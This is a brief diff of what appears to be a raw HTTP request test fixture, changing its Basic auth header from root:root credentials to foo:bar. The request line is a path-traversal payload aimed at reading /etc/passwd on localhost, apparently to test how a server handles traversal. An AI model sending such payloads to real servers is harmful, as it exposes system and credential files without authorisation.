@@ -1,4 +1,4 @@
 GET /trust/../../../../../etc/passwd HTTP/1.1
 HOST: 127.0.0.1
-Authorization: Basic cm9vdDpyb290
+Authorization: Basic Zm9vOmJhcg==
 
